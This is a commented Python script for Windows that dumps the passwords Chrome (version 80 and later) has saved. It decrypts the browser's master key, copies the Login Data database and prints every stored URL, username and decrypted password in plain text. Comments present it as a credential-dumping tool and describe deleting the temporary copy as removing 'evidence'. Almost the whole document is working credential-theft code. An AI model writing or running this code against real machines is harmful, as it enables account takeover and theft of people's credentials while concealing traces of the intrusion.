# This script (useful for Chrome password dumping for versions 80+) first decrypts the key to the login database,
# then decrypts the sought after password itself using AES cryptological methods built into Python's Cryptodome library.

import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil

def get_master_key():
 with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
     # This is the location where Chrome stores the password for the database holding logon information.
     local_state = f.read()
     local_state = json.loads(local_state)
     # This line reads the key: value pairs in the file.
 master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
 # The JSON "Local State" file is base64 encoded, so this line decodes the selected pair into bytes.
 master_key = master_key[5:]  
 # The master key needed to decrypt the password is from byte #5 on.
 master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
 # Decrypts the database password using the same method as the older version of Chrome
 return master_key

def decrypt_payload(cipher, payload):
 return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
 return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
 try:
     iv = buff[3:15]
     # Initialization vector taken from the encrypted password pulled from the Login database.
     payload = buff[15:]
     cipher = generate_cipher(master_key, iv)
     # Uses Python's Cryptodone library.
     decrypted_pass = decrypt_payload(cipher, payload)
     decrypted_pass = decrypted_pass[:-16].decode()  
     # Removes suffix bytes.
     return decrypted_pass
 except Exception as e:
     # print("Probably saved password from Chrome version older than v80\n")
     # print(str(e))
     return "Chrome < 80"

 
master_key = get_master_key()
login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
# Locates the same database (now locked in the later version of Chrome) as the older version of Chrome.
shutil.copy2(login_db, "Loginvault.db") 
# This makes a copy of the database because it is locked if Chrome is running.
conn = sqlite3.connect("Loginvault.db")
cursor = conn.cursor()
try:
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    for r in cursor.fetchall():
        url = r[0]
        username = r[1]
        encrypted_password = r[2]
        # Like the function for the older Chrome, SQL is used to SELECT the appropriate logon information.
        decrypted_password = decrypt_password(encrypted_password, master_key)
        if len(username) > 0:
            print("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
except Exception as e:
    pass
cursor.close()
conn.close()
# Close out your connections to databases; they're trackable!
try:
    os.remove("Loginvault.db")
    # Deletes evidence (temporary copy of database created above).
except Exception as e:
    pass
